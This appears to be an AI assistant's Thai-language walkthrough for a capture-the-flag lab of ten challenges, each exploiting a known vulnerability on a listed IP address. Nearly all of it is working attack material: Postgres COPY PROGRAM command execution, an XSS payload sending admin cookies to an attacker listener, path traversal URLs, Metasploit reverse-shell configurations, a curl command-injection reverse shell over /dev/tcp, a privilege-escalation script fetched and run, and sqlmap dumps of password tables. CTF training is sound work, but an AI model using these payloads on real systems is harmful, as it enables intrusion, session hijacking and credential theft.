 SARAN
Custom Gem

นี่คือสรุปขั้นตอนการทำโจทย์ (Walkthrough) แบบ Step-by-Step สำหรับแต่ละ Tower ตามข้อมูลที่คุณให้มาครับ
Tower #0: CVE-2019-9193 - Postgresql - RCE

เป้าหมาย: อ่านไฟล์ /tmp/flag.txt ผ่านช่องโหว่ Postgresql (Authenticated RCE)

    เชื่อมต่อ Database: ใช้ psql หรือ Tool อย่าง DBeaver/Metasploit เชื่อมต่อเข้าไป (โดยปกติใน CTF มักจะไม่มี password หรือใช้ password default เช่น postgres / postgres)
    Bash

psql -h 136.110.46.225 -p 5432 -U postgres

รัน Exploit (SQL Commands): ใช้ช่องโหว่ COPY PROGRAM เพื่อรันคำสั่ง Linux
SQL

    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec(cmd_output text);
    COPY cmd_exec FROM PROGRAM 'cat /tmp/flag.txt';
    SELECT * FROM cmd_exec;

    ผลลัพธ์: Flag จะแสดงออกมาในตาราง

Tower #1: Cross Site Script (XSS)

เป้าหมาย: ทำ Stored XSS เพื่อขโมย Session Admin หรือดูหน้า Admin

    หาจุด Injection: ไปที่หน้า "Support" หรือหน้าที่มีกล่องข้อความให้กรอก (Contact Form)

    เตรียม Payload (Steal Cookie): เราต้องการขโมย Cookie ของ Admin ที่เข้ามาดู

        ฝั่งเรา: เปิด Listener รอรับค่า nc -lvnp 4444 หรือใช้ RequestBin

        Payload:
        HTML

        <script>
        var i = new Image();
        i.src = "http://<IP_ของคุณ>:4444/?cookie=" + document.cookie;
        </script>

    ส่ง Payload: กด Submit ในหน้า Support

    รอ Admin เปิดอ่าน: เมื่อ Admin เปิดอ่านข้อความ Script จะทำงานและส่ง Cookie มาที่ nc ของเรา

    Hijack Session: นำ Cookie ที่ได้ไปใส่ใน Browser ของเรา (ใช้ Extension เช่น Cookie-Editor) แล้วเข้าหน้า /admin เพื่อดู Flag

Tower #2: Local File Inclusion (LFI)

เป้าหมาย: อ่านไฟล์ /tmp/flag.txt

    Fuzzing หา Parameter: ลองกดลิ้งก์ในเว็บดูว่ามี Parameter ไหนเรียกไฟล์บ้าง เช่น ?page=, ?file=, ?view=

    ทดสอบ LFI: ลองเปลี่ยนค่าเป็น /etc/passwd

        http://136.110.1.31/?page=../../../../etc/passwd

    อ่าน Flag: เมื่อเจอช่องโหว่แล้ว ให้อ่านไฟล์เป้าหมาย

        http://136.110.1.31/?page=../../../../tmp/flag.txt

        (หากไม่ได้ ลองเพิ่ม ../ ไปเรื่อยๆ หรือลองใช้ Null Byte %00 ต่อท้าย)

Tower #3: CVE-2019-15107 - Webmin - RCE

เป้าหมาย: RCE และอ่าน /tmp/flag_random.txt (อ้างอิงจากบทสนทนาก่อนหน้า)

    Metasploit:
    Bash

msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS 34.177.93.94
set RPORT 10000
set SSL true
set LHOST <IP_TUNNEL_ของคุณ>
set LPORT 4444
set PAYLOAD cmd/unix/reverse_python  <-- ใช้ Python เสถียรสุดใน Lab นี้
run

Get Flag: เมื่อได้ Shell
Bash

    cat /tmp/flag_random.txt

Tower #4: CVE-2020-11651 - SaltStack

เป้าหมาย: RCE ผ่าน Salt Master

    หา Exploit Script: ค้นหา CVE-2020-11651 exploit python ใน Github (แนะนำตัวที่ชื่อ salt-exploit หรือ exploit.py)

    รัน Script:
    Bash

    # ตรวจสอบความเสี่ยง
    python3 exploit.py --master 34.87.46.136 --check

    # อ่านไฟล์โดยตรง (ถ้า Script รองรับ) หรือรันคำสั่ง cat
    python3 exploit.py --master 34.87.46.136 --exec "cat /tmp/flag_xxxxx.txt"

    ผลลัพธ์: Flag จะแสดงที่หน้าจอ

Tower #5: CVE-2018-10933 - LibSSH - Auth Bypass

เป้าหมาย: Bypass Login SSH

    หา Exploit Script: ค้นหา CVE-2018-10933 python exploit (ช่องโหว่นี้เกิดจากการส่ง packet MSG_USERAUTH_SUCCESS ไปดื้อๆ)

    รัน Script:
    Bash

    python3 libssh_bypass.py --host 34.87.63.36 --port 22 --cmd "cat /root/flag_xxxxxx.txt"

    (ใน script อาจจะต้องแก้ parameter ให้ตรงกับโจทย์)

Tower #6: Privilege Escalation

เป้าหมาย: ยกระดับสิทธิ์จาก noob เป็น root

    Login: ssh noob@34.87.11.201 -p 4200 (Pass: N00bP@ssw0rd)

    Recon (LinPEAS):

        เครื่องเรา: python3 -m http.server 80

        เครื่องเหยื่อ:
        Bash

        cd /tmp
        wget http://<IP_เครื่องเรา>/linpeas.sh
        chmod +x linpeas.sh
        ./linpeas.sh

    Analyze & Exploit: ดูผลลัพธ์ที่เป็น สีแดง/เหลือง

        Case Sudo: ถ้าเจอ sudo -l (NO PASSWD) ให้รันคำสั่งนั้นเพื่อเป็น root

        Case SUID: ถ้าเจอไฟล์แปลกๆ มีสิทธิ์ SUID ให้หาใน GTFOBins

        Case Kernel: ถ้าเจอ Kernel เก่ามากๆ (เช่น DirtyCow) ให้โหลด C code มา compile แล้วรัน

    Get Flag: cat /root/flag_xxxxxx.txt

Tower #7: Apache Tomcat CVE-2020-1938 (Ghostcat)

เป้าหมาย: อ่านไฟล์ผ่าน AJP Port 8009 (อ้างอิงจากบทสนทนาก่อนหน้า)

    Metasploit:
    Bash

    use auxiliary/admin/http/tomcat_ghostcat
    set RHOSTS 34.87.102.147
    set RPORT 8009
    # ตั้งค่า Path Traversal เพื่อไปหาไฟล์ Flag
    set RFILE ../../../../../root/flag.txt
    # สำคัญ: ต้องตั้ง JSP_ROOT ให้เป็น Root ของ Webapp เพื่อให้ Traversal ทำงาน
    set JSP_ROOT /ROOT  (หรือ /)
    run

    ผลลัพธ์: เนื้อหาในไฟล์ Flag จะถูก Dump ออกมา

Tower #8: CVE-2017-17405 - Command Injection - Ruby

เป้าหมาย: RCE ผ่าน Ruby Net::FTP

    Metasploit:
    Bash

use exploit/linux/http/ruby_net_ftp_cve_2017_17405
set RHOSTS 34.124.149.106
set RPORT 8080
set TARGETURI /  (หรือ path ที่โจทย์กำหนด เช่น /download)
set PAYLOAD cmd/unix/reverse_python
set LHOST <IP_TUNNEL>
set LPORT 4444
run

Manual (Curl) - ถ้าใช้ Metasploit ไม่ได้: ช่องโหว่นี้มักเกิดจากการส่ง path ที่เป็น | command
Bash

    # ทดสอบสร้างไฟล์
    curl "http://34.124.149.106:8080/download?uri=ftp://example.com/&file=|touch%20/tmp/pwned"
    # ยิง Reverse Shell
    curl "http://34.124.149.106:8080/download?uri=ftp://example.com/&file=|bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<IP>/4444%200>%261'"

    Get Flag: cat /usr/src/flag.txt (ชื่อไฟล์อาจต้อง ls ดูก่อน)

Tower #9: Wordpress SQL Injection

เป้าหมาย: อ่าน Flag ใน Database

    Scan: ใช้ wpscan หา Plugin ที่มีช่องโหว่
    Bash

wpscan --url http://35.240.142.53 --enumerate p

Exploit SQLi: สมมติเจอ plugin ชื่อ video-synchro-pdf (หรือตัวอื่นที่มี CVE SQLi)

    ใช้ SQLMap ยิง URL ของ Plugin นั้น

Bash

    sqlmap -u "http://35.240.142.53/wp-content/plugins/<plugin_name>/...id=1" --dbs

    Dump Data:

        หา Table: -D wordpress --tables

        หา Column: -D wordpress -T wp_users --columns (หรือ table อื่นที่ชื่อเหมือน flag)

        Dump: -D wordpress -T wp_users -C user_login,user_pass --dump

    ผลลัพธ์: Flag อาจจะอยู่ในตาราง wp_users ตรง password หรืออยู่ในตารางแยกต่างหากชื่อ wp_flag

